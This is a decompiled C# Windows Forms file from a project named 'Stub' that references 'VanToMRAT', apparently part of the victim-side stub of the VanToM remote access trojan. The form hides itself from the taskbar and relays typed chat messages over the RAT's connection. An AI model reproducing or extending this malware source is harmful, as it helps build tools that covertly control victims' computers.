using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Stub.My;

namespace Stub
{
	// Token: 0x02000036 RID: 54
	[DesignerGenerated]
	public partial class Form3 : Form
	{
		// Token: 0x0600012C RID: 300 RVA: 0x0000EEE8 File Offset: 0x0000D0E8
		[DebuggerNonUserCode]
		public Form3()
		{
			base.Load += this.Form3_Load;
			Form3.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x0600012D RID: 301 RVA: 0x0000EF14 File Offset: 0x0000D114
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form3.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form3.__ENCList.Count == Form3.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form3.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form3.__ENCList[num4];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num4 != num;
								if (flag2)
								{
									Form3.__ENCList[num] = Form3.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						Form3.__ENCList.RemoveRange(num, Form3.__ENCList.Count - num);
						Form3.__ENCList.Capacity = Form3.__ENCList.Count;
					}
					Form3.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000130 RID: 304 RVA: 0x0000F318 File Offset: 0x0000D518
		// (set) Token: 0x06000131 RID: 305 RVA: 0x0000F334 File Offset: 0x0000D534
		internal virtual TextBox Sendbox
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Sendbox;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyPressEventHandler value2 = new KeyPressEventHandler(this.Sendbox_KeyPress);
				bool flag = this._Sendbox != null;
				if (flag)
				{
					this._Sendbox.KeyPress -= value2;
				}
				this._Sendbox = value;
				flag = (this._Sendbox != null);
				if (flag)
				{
					this._Sendbox.KeyPress += value2;
				}
			}
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000132 RID: 306 RVA: 0x0000F39C File Offset: 0x0000D59C
		// (set) Token: 0x06000133 RID: 307 RVA: 0x0000F3B8 File Offset: 0x0000D5B8
		internal virtual TextBox Recv
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Recv;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Recv_Resize);
				bool flag = this._Recv != null;
				if (flag)
				{
					this._Recv.Resize -= value2;
				}
				this._Recv = value;
				flag = (this._Recv != null);
				if (flag)
				{
					this._Recv.Resize += value2;
				}
			}
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000134 RID: 308 RVA: 0x0000F420 File Offset: 0x0000D620
		// (set) Token: 0x06000135 RID: 309 RVA: 0x0000F43C File Offset: 0x0000D63C
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x06000136 RID: 310 RVA: 0x0000F448 File Offset: 0x0000D648
		private void Form3_Load(object sender, EventArgs e)
		{
			this.ShowInTaskbar = false;
		}

		// Token: 0x06000137 RID: 311 RVA: 0x0000F454 File Offset: 0x0000D654
		private void Sendbox_KeyPress(object sender, KeyPressEventArgs e)
		{
			bool flag = e.KeyChar == '\r';
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Sendbox.Text, "", false) == 0;
				if (!flag2)
				{
					TextBox recv = this.Recv;
					recv.Text = recv.Text + Environment.NewLine + "You : " + this.Sendbox.Text;
					MyProject.Forms.VanToMRAT.c.Send("recv|VanToM|" + this.Sendbox.Text);
					this.Sendbox.Text = "";
				}
			}
		}

		// Token: 0x06000138 RID: 312 RVA: 0x0000F504 File Offset: 0x0000D704
		private void Recv_Resize(object sender, EventArgs e)
		{
			this.Recv.ScrollToCaret();
		}

		// Token: 0x04000113 RID: 275
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000115 RID: 277
		[AccessedThroughProperty("Sendbox")]
		private TextBox _Sendbox;

		// Token: 0x04000116 RID: 278
		[AccessedThroughProperty("Recv")]
		private TextBox _Recv;

		// Token: 0x04000117 RID: 279
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;
	}
}
